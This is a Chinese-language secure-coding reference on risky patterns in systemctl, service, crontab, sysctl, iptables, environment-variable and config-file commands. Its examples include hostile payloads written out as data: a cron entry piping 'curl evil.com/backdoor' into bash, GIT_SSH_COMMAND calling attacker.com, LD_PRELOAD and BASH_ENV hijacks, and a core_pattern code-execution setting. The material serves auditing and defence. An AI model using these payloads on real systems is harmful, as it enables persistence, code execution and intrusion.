# systemctl / service / crontab 命令安全风险

## 涉及的安全问题
- 修改配置未校验参数（服务管理、定时任务、系统配置）
- 命令注入（systemd service 文件创建、crontab 命令执行）

## 高危模式

### 修改配置未校验参数 — systemctl
```bash
systemctl $ACTION $SERVICE
systemctl start "$USER_SERVICE"
systemctl stop "$USER_SERVICE"
systemctl restart "$USER_SERVICE"
systemctl enable "$USER_SERVICE"
systemctl disable "$USER_SERVICE"
# ACTION = "stop" 且 SERVICE = "firewalld" → 关闭防火墙
# SERVICE = "evil.service" → 启动恶意服务
```

### 修改配置未校验参数 — service / init.d
```bash
service $SERVICE $ACTION
service "$USER_SERVICE" start
service "$USER_SERVICE" stop
/etc/init.d/$SERVICE $ACTION
/etc/init.d/"$USER_SERVICE" restart
invoke-rc.d "$USER_SERVICE" "$USER_ACTION"
```

### 修改配置未校验参数 — 开机自启
```bash
update-rc.d "$USER_SERVICE" defaults
chkconfig "$USER_SERVICE" on
```

### 命令注入 — systemd service 文件创建
```bash
echo "[Unit]" > /etc/systemd/system/"$USER_SERVICE".service
echo "ExecStart=$USER_CMD" >> /etc/systemd/system/"$USER_SERVICE".service
systemctl daemon-reload
systemctl start "$USER_SERVICE"
# 创建并启动任意 systemd 服务，ExecStart 执行任意命令
```

### 修改配置未校验参数 — supervisor / monit
```bash
supervisorctl $ACTION "$USER_PROCESS"
monit $ACTION "$USER_SERVICE"
```

### 命令注入 — crontab
```bash
echo "$USER_CRON" | crontab -
(crontab -l; echo "$USER_CRON") | crontab -
# USER_CRON = "* * * * * curl evil.com/backdoor | bash"
```

### 修改配置未校验参数 — sysctl
```bash
sysctl -w "$USER_SYSCTL"
# USER_SYSCTL = "kernel.core_pattern=|/tmp/evil"
# core_pattern 可触发代码执行
```

### 修改配置未校验参数 — iptables
```bash
iptables -A INPUT -s "$USER_IP" -j ACCEPT
# USER_IP = "0.0.0.0/0" → 放行所有流量
```

### 命令注入 — 环境变量注入

当进程创建时环境变量可控，攻击者可通过特殊环境变量实现命令注入或方法劫持。

各语言设置环境变量的方法：
- Java: `ProcessBuilder#environment()` 的 `put`/`putAll`
- Python: `os.environ`、`os.putenv()`
- C: `putenv()`、`setenv()`
- NodeJS: `process.env`
- Go: `os.Setenv()`、`exec.Cmd.Env`
- PHP: `putenv()`

```bash
# LD_PRELOAD — 动态链接库劫持（所有 Linux 发行版）
export LD_PRELOAD=/tmp/evil.so
# 优先级: LD_PRELOAD > LD_LIBRARY_PATH > /etc/ld.so.cache > /lib > /usr/lib
# 构造同名方法覆盖系统库函数，编译为 .so 后劫持任意方法
# 后缀名不限于 .so，可以是任意格式

# ENV / BASH_ENV — shell 启动时执行（SuSE、Ubuntu、EulerOS、Kali 等）
export BASH_ENV=/tmp/evil.sh
# sh/bash/dash 执行命令时，从 ENV/BASH_ENV 获取值并解析为 shell 语法执行
# dash 需存在 -i 参数时触发

# PS1/PS2/PS3/PS4 — 命令行提示符注入（所有 Linux 发行版）
export PS1='$(malicious_cmd)'
export PS4='$(malicious_cmd)'
# PS4 在 set -x 调试模式下触发，原理与 ENV/BASH_ENV 类似

# PROMPT_COMMAND — 显示 PS1 前执行（所有 Linux 发行版）
export PROMPT_COMMAND='malicious_cmd'
# 每次显示提示符前自动回调执行

# BASH_FUNC_xxx%% — 函数覆盖（所有 Linux 发行版）
# Bash 4.3.30+: BASH_FUNC_xxx%% 格式导入函数覆盖已有函数
# Bash 4.3.30-: 等号右侧匹配 () { 即可

# GIT_SSH_COMMAND — Git SSH 命令注入（Git >= 2.3.0）
export GIT_SSH_COMMAND="curl http://attacker.com"
git pull origin master
# 支持额外命令行参数，命令由 Shell 解析
# GIT_SSH_COMMAND="$(curl http://attacker.com)" git pull origin master

# GIT_SSH — Git SSH 程序指定（Git >= 2.3.0）
export GIT_SSH="/tmp/evil_program"
# 只能指定一个可执行程序，不能指定命令行参数

export "$USER_VAR"
# USER_VAR = "LD_PRELOAD=/tmp/evil.so" → 动态链接劫持
# USER_VAR = "PATH=/tmp/evil:$PATH" → 命令劫持

env "$USER_VAR=$USER_VALUE" command
```

### 修改配置未校验参数 — 配置文件写入
```bash
echo "server=$USER_SERVER" >> /etc/app/servers.conf
# USER_SERVER = "evil.com\nallow_root=true"

echo "$USER_KEY=$USER_VALUE" >> /etc/app.conf
# 攻击者同时控制键和值

echo "$USER_KEY=$USER_VALUE" >> .env
# 可注入 DATABASE_URL、SECRET_KEY 等敏感配置

echo "AuthorizedKeysCommand $USER_CMD" >> /etc/ssh/sshd_config
```
